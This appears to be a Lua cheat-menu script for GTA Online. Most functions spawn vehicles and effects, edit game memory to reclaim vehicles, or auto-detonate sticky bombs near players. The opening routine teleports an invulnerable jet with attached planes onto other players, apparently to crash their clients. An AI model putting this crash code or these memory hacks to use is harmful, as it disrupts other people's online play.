        local jet = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
        ENTITY.SET_ENTITY_PROOFS(jet, true, true, true, true, true, true, true, true)
        if players.exists(to_ply) then 
            local asda = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(to_ply)) 
            util.toast('Player ID: '..to_ply..' | asda.x: '.. asda.x.. 'asda.y: '.. asda.y..'asda.z: '.. asda.z)
            ENTITY.SET_ENTITY_COORDS(jet, asda.x, asda.y, asda.z + 50, false, false, false, true) 
            to_ply = to_ply +1
        else 
            if to_ply >= 32 then to_ply = 0 end
            to_ply = to_ply +1 
            local let_coords = plane_crash_coords[math.random(1, #plane_crash_coords)]
            ENTITY.SET_ENTITY_COORDS(jet, let_coords[1], let_coords[2], let_coords[3], false, false, false, true) 
        end
            
        ENTITY.SET_ENTITY_VELOCITY(jet, 0, 0, 0) -- velocity sync fuck
        ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        local pedpos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
        pedpos.z = pedpos.z + 10
        for i = 1, 2 do
            local s_plane = crash_planes[math.random(1, #crash_planes)]
            request_model(util.joaat(s_plane))
            local veha1 = entities.create_vehicle(util.joaat(s_plane), pedpos, 0)

            ENTITY.ATTACH_ENTITY_TO_ENTITY_PHYSICALLY(veha1, jet, 0, 0, 0, 0, 5 + (2 * i), 0, 0, 0, 0, 0, 0, 1000, true, true, true, true, 2)
        end
        util.yield(100) -- 5k is original
        for i = 1, 25 do -- 50 is original
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
            util.yield()
        end
    else
        request_model(util.joaat('hydra'))
        local spawn_in = entities.create_vehicle(util.joaat('hydra'), ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID()), 0.0)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), spawn_in, -1)
    end
end


----索赔载具
function bitTest(addr, offset)
    return (memory.read_int(addr) & (1 << offset)) ~= 0
end
function reclaimVehicles()
    local global = Global_Base.vehicle_global
    local count = memory.read_int(memory.script_global(global)) --vehicle_global --https://github.com/YimMenu/YimMenu/blob/master/src/core/scr_globals.hpp
    for i = 0, count do
        local canFix = (bitTest(memory.script_global(global + 1 + (i * 142) + 103), 1) and bitTest(memory.script_global(global + 1 + (i * 142) + 103), 2))
        if canFix then
            MISC.CLEAR_BIT(memory.script_global(global + 1 + (i * 142) + 103), 1)
            MISC.CLEAR_BIT(memory.script_global(global + 1 + (i * 142) + 103), 3)
            MISC.CLEAR_BIT(memory.script_global(global + 1 + (i * 142) + 103), 16)
            notification("~bold~~y~索赔完成", HudColour.blue)
        end
    end
    --[[ for k, v in menu.get_children(menu.ref_by_path("Vehicle>Personal Vehicles")) do
        for k1, v1 in v.command_names do
            if v1 ~= "findpv" then
                if v1 == "pv2" then
                    menu.trigger_commands(v1.."request")
                end
            end
        end
	end]]
end

----飞天扫把
function flying_broom()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    local broomstick = util.joaat("prop_tool_broom")
    local oppressor = util.joaat("oppressor2")
    local obj = create_object(broomstick, pos.x, pos.y, pos.z)
    local veh = create_vehicle(oppressor, pos.x, pos.y, pos.z, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, false)
    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), veh, -1)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(obj, veh, 0, 0, 0, 0.3, -80.0, 0, 0, true, false, false, false, 0, true, 0)
end
----驾驶超级飞机
function super_phane()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local Heading = ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID())
    local carhash = 1483171323 --德罗索
    local phanehash = -1214505995 --飞机
    local car = create_vehicle(carhash, pos.x, pos.y, pos.z, Heading)
    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), car, -1)
    ENTITY.SET_ENTITY_VISIBLE(car, false)

    local phane = create_vehicle(phanehash, pos.x, pos.y, pos.z, Heading)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(phane, car, 0, 0, 0, 0, 0, 0, 0, true, false, false,false, 0, true)
end


----分离元素
function detach_all_entities()
    local vehs = entities.get_all_vehicles_as_handles()
    local objs = entities.get_all_objects_as_handles()
    local peds = entities.get_all_peds_as_handles()
    for k,v in pairs(vehs) do
        if ENTITY.IS_ENTITY_ATTACHED(v) then
            request_control(v)
            ENTITY.DETACH_ENTITY(v, false, false)
            --ENTITY.SET_ENTITY_COLLISION(v, false, true)
        end
    end
    for k,v in pairs(objs) do
        if ENTITY.IS_ENTITY_ATTACHED(v) then
            request_control(v)
            ENTITY.DETACH_ENTITY(v, false, false)
            --ENTITY.SET_ENTITY_COLLISION(v, false, true)
        end
    end
    for k,v in pairs(peds) do
        if ENTITY.IS_ENTITY_ATTACHED(v) then
            request_control(v)
            ENTITY.DETACH_ENTITY(v, false, false)
            --ENTITY.SET_ENTITY_COLLISION(v, false, true)
        end
    end
end

----阻止附加模型
function Block_attached_models()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
    local vehs = entities.get_all_vehicles_as_handles()
    local objs = entities.get_all_objects_as_handles()
    local peds = entities.get_all_peds_as_handles()
    for k,v in pairs(vehs) do
        if ENTITY.IS_ENTITY_ATTACHED_TO_ENTITY(v, vehicle) then
            request_control(v)
            ENTITY.DETACH_ENTITY(v, false, false)
            ENTITY.SET_ENTITY_COLLISION(v, false, true)
        end
    end
    for k,v in pairs(objs) do
        if ENTITY.IS_ENTITY_ATTACHED_TO_ENTITY(v, vehicle) then
            request_control(v)
            ENTITY.DETACH_ENTITY(v, false, false)
            ENTITY.SET_ENTITY_COLLISION(v, false, true)
        end
    end
    for k,v in pairs(peds) do
        if ENTITY.IS_ENTITY_ATTACHED_TO_ENTITY(v, vehicle) then
            request_control(v)
            ENTITY.DETACH_ENTITY(v, false, false)
            ENTITY.SET_ENTITY_COLLISION(v, false, true)
        end
    end
end


----热成像枪
local thermal_command = menu.ref_by_path('Game>Rendering>Thermal Vision')
function thermalgun()
    local aiming = PLAYER.IS_PLAYER_FREE_AIMING(PLAYER.PLAYER_ID())
    if GRAPHICS.GET_USINGSEETHROUGH() and not aiming then
        menu.trigger_command(thermal_command,'off')
        GRAPHICS1._SEETHROUGH_SET_MAX_THICKNESS(1)
    elseif PAD.IS_CONTROL_JUST_PRESSED(38,38) then
        if menu.get_value(thermal_command) or not aiming then
            menu.trigger_command(thermal_command,"off")
            GRAPHICS1._SEETHROUGH_SET_MAX_THICKNESS(1)
        else
            menu.trigger_command(thermal_command,"on")
            GRAPHICS1._SEETHROUGH_SET_MAX_THICKNESS(50)
        end
    end
end


--恶灵骑士
function elqss(on)
    if on then
        notification("~bold~~y~按E使用战车技能", HudColour.blue)
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
        local vhash = 1491277511
        local obj = 1793667637
        request_model(vhash)
        request_model(obj)
        ghost_car = entities.create_vehicle(1491277511, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(ghost_car,true)
        ghost_nuts = OBJECT.CREATE_OBJECT(1793667637, pos.x, pos.y, pos.z, true, false, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ghost_nuts, ghost_car, 0, 0, 0, 0, 0, 0, 0, true, false, false, false, 0, true, 0)
        local titlle = "scr_martin1"
        local hashid = "scr_sol1_plane_engine_fire"
        request_ptfx_asset(titlle)
        GRAPHICS.USE_PARTICLE_FX_ASSET(titlle)
        GRAPHICS.START_PARTICLE_FX_LOOPED_ON_ENTITY(hashid, ghost_nuts, 0, 0.1, -0.3, 180, 0, 0, 0.5, 1, 1, 1)
        SYSTEM.WAIT(500)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), ghost_car, -1)
        while ghost_car do
            if PAD.IS_CONTROL_PRESSED(0,46) then
                local titlle1 = "weap_xs_vehicle_weapons"
                local hashid1 = "muz_xs_turret_flamethrower_looping"
                request_ptfx_asset(titlle1)
                GRAPHICS.USE_PARTICLE_FX_ASSET(titlle1)
                GRAPHICS.START_PARTICLE_FX_LOOPED_ON_ENTITY(hashid1, ghost_car, 0, 1, 0.5, 180, 0, 0, 1, 1, 1, 1)
                util.yield(500)
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(ghost_car)
            end
            util.yield()
        end
    else
        delete_entity(ghost_car)
        delete_entity(ghost_nuts)
    end
end

----光环
Colour = {}
Colour.new = function(R, G, B, A)
    return {r = R or 0, g = G or 0, b = B or 0, a = A or 0}
end
function personllight()
    local localPed = PLAYER.PLAYER_PED_ID()
    local fect = Effect.new("scr_xm_farm", "scr_xm_dst_elec_crackle")
    local effect = Effect.new("scr_ie_tw", "scr_impexp_tw_take_zone")
    local colour = Colour.new(5, 0, 0, 30)
    local colour2 = Colour.new(5, 50, 10, 30)
    request_ptfx_asset(effect.asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, 0.75,
        0.0, 0.0, 0.0,
        0.09,
        false, false, false)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour2.r, colour2.g, colour2.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, -2.9,
        0.0, 0.0, 0.0,
        1.0,
        false, false, false)
end


----拉便便
function personlshit()
    local agroup = "missfbi3ig_0"
    local anim = "shit_loop_trev"
    local mshit = MISC.GET_HASH_KEY("prop_big_shit_02")
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    request_anim_dict(agroup)
    TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true) --play anim
    util.yield(1000)
    create_object(mshit, c.x, c.y, c.z - 1) --spawn shit
end
--打飞机
function personlhitplane() 
    local agroup2 = "switch@trevor@jerking_off"
    local anim2 = "trev_jerking_off_loop"
    local cum = MISC.GET_HASH_KEY("p_oil_slick_01")
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 1, 0)
    request_anim_dict(agroup2)
    TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), agroup2, anim2, 8.0, 8.0, 5000, 1, 0, true, true, true) --play anim
    util.yield(4500)
    create_object(cum, c.x, c.y, c.z - 1) --spawn cum
end



--粘弹爆炸
local detonate_radius = 2
function autoExplodeStickys(ped)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    if MISC.IS_PROJECTILE_TYPE_WITHIN_DISTANCE(pos.x, pos.y, pos.z, util.joaat('weapon_stickybomb'), detonate_radius, true) then
        WEAPON.EXPLODE_PROJECTILES(PLAYER.PLAYER_PED_ID(), util.joaat('weapon_stickybomb'))
    end
end
function proxyStickys()
    if detonate_players then
        local specificWhitelistGroup = {user = false,  friends = whitelistGroups.friends, strangers = whitelistGroups.strangers}
        for _, pid in pairs(players.list(true, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED(pid)
            autoExplodeStickys(ped)
        end
    end
    if detonate_npcs then
        local pedHandles = entities.get_all_peds_as_handles()
        for _, ped in pairs(pedHandles) do
            if not PED.IS_PED_A_PLAYER(ped) then
                autoExplodeStickys(ped)
            end
        end
    end
end



--绘制时速
function speedinfo()
    local ent = PLAYER.PLAYER_PED_ID()
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(),true) then
        ent = PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID())
    end
    local speed = math.ceil(ENTITY.GET_ENTITY_SPEED(ent) * 3.6)
    draw_string(string.format("~bold~~italic~~o~"..speed .. "  ~w~KM/H"), 0.76,0.8, 1,6)
end

--摔倒
local fallTimeout = false
function tripped1(toggle)
    if toggle then
        local vector = ENTITY.GET_ENTITY_FORWARD_VECTOR(PLAYER.PLAYER_PED_ID())
        PED.SET_PED_TO_RAGDOLL_WITH_FALL(PLAYER.PLAYER_PED_ID(), 1500, 2000, 2, vector.x, -vector.y, vector.z, 1, 0, 0, 0, 0, 0, 0)
    end
    fallTimeout = toggle
    while fallTimeout do
        PED.RESET_PED_RAGDOLL_TIMER(PLAYER.PLAYER_PED_ID())
        util.yield_once()
    end
end